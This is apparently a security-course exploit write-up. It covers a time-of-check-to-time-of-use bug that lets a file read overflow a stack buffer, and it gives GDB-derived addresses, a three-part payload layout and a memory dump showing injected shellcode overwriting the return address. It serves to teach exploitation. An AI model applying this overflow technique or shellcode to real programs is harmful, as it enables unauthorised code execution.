# Question 5: Deneb Write-up
## Main Idea
#### (A description of the vulnerability)
The code is vulnerable because between the bound check of the file (if it is too large) and the use of that file when it is read (```read``` function), the state of the file can be changed. 

```
    if (file_is_too_big(fd)) EXIT_WITH_ERROR("File too big!");

    printf("How many bytes should I read? ");
    fflush(stdout);
    if (scanf("%u", &bytes_to_read) != 1)
    EXIT_WITH_ERROR("Could not read the number of bytes to read!");

    ssize_t bytes_read = read(fd, buf, bytes_to_read);
    if (bytes_read == -1) EXIT_WITH_ERROR("Could not read!");
```
This is a Time-Of-Check To Time-Of-Use  (TOCTTOU) vulnerability. 

## Magic Numbers
#### (How any relevant “magic numbers” were determined, usually with GDB)
We first determined the address of the ```buf``` (0xffffd598) and the address of rip of ```read_file``` (0xffffd62c).This was done by invoking GDB and setting a breakpoint at line 30.
```
(gdb) x/64x buf
0xffffd598:     0x00000020      0x00000006      0x00001000      0x00000000
0xffffd5a8:     0x00000000      0x0804904a      0x00000000      0x000003ed
0xffffd5b8:     0x000003ed      0x000003ed      0x000003ed      0xffffd79b
0xffffd5c8:     0x0fcbfbfd      0x00000064      0x00000000      0x00000000
0xffffd5d8:     0x00000000      0x00000000      0x00000000      0x00000001
0xffffd5e8:     0x00000000      0xffffd78b      0x00000002      0x00000000
0xffffd5f8:     0x00000000      0x00000000      0x00000000      0xffffdfe6
0xffffd608:     0xf7ffc540      0xf7ffc000      0x00000000      0x00000000
0xffffd618:     0x00000000      0x00000000      0x00000000      0x00000000
0xffffd628:     0xffffd638      0x0804939c      0x00000001      0x08049391
0xffffd638:     0xffffd6bc      0x0804956a      0x00000001      0xffffd6b4
0xffffd648:     0xffffd6bc      0x080510a1      0x00000000      0x00000000
0xffffd658:     0x08049548      0x08053fe8      0x00000000      0x00000000
0xffffd668:     0x00000000      0x08049097      0x08049391      0x00000001
0xffffd678:     0xffffd6b4      0x08049000      0x08050b19      0x00000000
0xffffd688:     0x00000000      0x00000000      0x00000000      0x0804906b

(gdb) i f
Stack level 0, frame at 0xffffd630:
 eip = 0x8049238 in read_file (orbit.c:30); saved eip = 0x804939c
 called by frame at 0xffffd640
 source language c.
 Arglist at 0xffffd628, args:
 Locals at 0xffffd628, Previous frame's sp is 0xffffd630
 Saved registers:
  ebp at 0xffffd628, eip at 0xffffd62c
```

## Exploit Structure
#### (A description of your exploit structure)
The exploit has three parts:
1. Write 148 dummy characters to overwrite ```buf```, compiler padding and the sfp of ```read_file```
2. Overwrite the rip of ```read_file``` with the address of the shellcode. Since we are putting our shellcode right after the rip, the address would be rip + 4 = 0xffffd62c + 4 = 0xffffd630
3. Finally, insert the shellcode right after the rip.
This causes the shellcode at 0xffffd630 to execute after the ```read_file``` function returns.

## Exploit GDB Output
#### (GDB output demonstrating the before/after of the exploit working)
When we ran GDB after inputting the malicious exploit string, we got the following output:
```
(gdb) x/64x buf
0xffffd598:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd5a8:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd5b8:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd5c8:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd5d8:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd5e8:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd5f8:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd608:     0x41414141      0x41414141      0x41414141      0x41414141
0xffffd618:     0x000000e0      0x41414141      0x41414141      0x41414141
0xffffd628:     0x41414141      0xffffd630      0xdb31c031      0xd231c931
0xffffd638:     0xb05b32eb      0xcdc93105      0xebc68980      0x3101b006
0xffffd648:     0x8980cddb      0x8303b0f3      0x0c8d01ec      0xcd01b224
0xffffd658:     0x39db3180      0xb0e674c3      0xb202b304      0x8380cd01
0xffffd668:     0xdfeb01c4      0xffffc9e8      0x414552ff      0x00454d44
0xffffd678:     0xffffd600      0x08049000      0x08050b19      0x00000000
0xffffd688:     0x00000000      0x00000000      0x00000000      0x0804906b
```
After 148 bytes of garbage, the rip is overwritten with 0xffffd630, which points to the shellcode directly after the rip.